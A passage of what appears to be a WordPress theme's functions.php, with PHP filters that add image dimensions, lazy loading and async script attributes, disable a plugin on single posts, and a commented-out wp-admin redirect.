        $image_src = wp_get_attachment_image_src( $attachment->ID, $size );
        $attr['width'] = $image_src[1];
        $attr['height'] = $image_src[2];
    }
    return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'add_image_dimensions', 10, 3 );


// Lazy load images
function add_lazyload_to_images( $content ) {
    return str_replace( '<img', '<img loading="lazy"', $content );
}
add_filter( 'the_content', 'add_lazyload_to_images' );


function async_defer_scripts($tag, $handle, $src) {
    // Specify scripts to exclude from async/defer (like jQuery if needed)
    $exclusions = array('jquery');

    // Check if user is not logged in or is not an admin
    if (!is_admin()) {
        // Check if script is not in exclusions list
        if (!in_array($handle, $exclusions)) {
            // Add async or defer attribute.
            if (strpos($tag, 'text/javascript') !== false) {
                //$tag = str_replace(' src', ' defer="defer" src', $tag); // defer
                $tag = str_replace(' src', ' async="async" src', $tag); // async
            }
        }
    }

    return $tag;
}
add_filter('script_loader_tag', 'async_defer_scripts', 10, 3);

add_filter('option_active_plugins', 'disable_plugin_on_single_posts');
function disable_plugin_on_single_posts($plugins) {
    if (is_single()) {
        $plugin = 'debloat/debloat.php';
        $key = array_search($plugin, $plugins);
        if (false !== $key) {
            unset($plugins[$key]);
        }
    }
    return $plugins;
}

// // Redirect /wp-admin to /wp-login.php
// function redirect_wp_admin_to_login() {
//     global $pagenow;
//     if ($pagenow === 'wp-admin' && $_SERVER['REQUEST_URI'] === '/wp-admin') {
//         wp_redirect(site_url('/wp-login.php'), 301);
//         exit();
//     }
// }
// add_action('init', 'redirect_wp_admin_to_login');
